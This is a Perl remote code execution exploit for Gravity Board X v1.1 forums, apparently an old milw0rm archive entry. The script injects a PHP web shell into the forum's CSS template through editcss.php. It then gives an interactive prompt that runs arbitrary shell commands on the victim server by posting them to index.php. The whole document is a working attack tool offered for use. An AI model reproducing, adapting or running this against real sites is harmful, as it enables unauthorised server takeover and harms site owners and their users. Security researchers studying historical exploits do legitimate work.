#!/usr/bin/perl

## Gravity Board X v1.1 (possibly prior versions) remote code execution exploit
## (c)oded by 1dt.w0lf
## 14.08.2005
## RST/GHC
## http://rst.void.ru
## http://ghc.ru

use LWP::UserAgent;

if(@ARGV<1) { &usage; exit(0); }

$path = $ARGV[0];
header();
print "Creating shell... Please wait\n";

$gr = LWP::UserAgent->new() or die;
$res = $gr->get($path.'editcss.php?csscontent=</style><?php error_reporting(0); system($HTTP_POST_VARS[cmd]); ?>');
if($res->as_string =~ /unable to save changes/)
 {
 print "Forum unable to save changes in css template. Exploitation failed.\n";
 exit(0);
 }
print "DONE.\n";

while ()
 {
    print "Type command for execute or 'q' for exit\nGravity# ";
    while(<STDIN>)
     {
        $cmd=$_;
        chomp($cmd);
        exit() if ($cmd eq 'q');
        last;
     }
    &run($cmd);
 }

sub run()
 {
 $cmd2  = 'echo 1 && echo _START_ && ';
 $cmd2 .= $cmd;
 $cmd2 .= ' && echo _END_';
 $gr = LWP::UserAgent->new() or die;
 $res = $gr->post($path.'index.php',{"cmd" => "$cmd2"});   
 @result = split(/\n/,$res->content);
 $runned = 0;
 $on = 0;
 print "\n";
 for $res(@result)
  {
    if ($res =~ /^_END_/) { print "\n"; return 0; }
    if ($on == 1) { print "  $res\n"; }
    if ($res =~ /^_START_/) { $on = 1; $runned = 1; } 
  }
 print "Can't execute command\n" if !$runned;
 }

sub header()
{
 print "--* Gravity Board X v1.1 exploit by RST/GHC\n";
 print "--* keep it private, not for public\n";
}

sub usage()
 {
  header();
  print "usage : r57Gravity.pl [path_to_forum]\n";
  print "  e.g.: r57Gravity.pl http://127.0.0.1/forum/\n";
 }

# milw0rm.com [2006-02-17]
